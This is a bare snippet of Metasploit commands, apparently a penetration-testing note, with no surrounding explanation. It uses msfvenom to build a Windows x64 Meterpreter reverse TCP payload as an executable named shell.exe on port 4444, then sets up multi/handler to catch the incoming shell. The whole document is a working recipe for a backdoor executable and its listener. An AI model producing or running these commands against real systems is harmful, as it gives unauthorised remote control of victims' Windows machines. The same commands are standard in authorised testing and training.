```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=4444 -f exe shell.exe

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost
set lport
show options
run
```

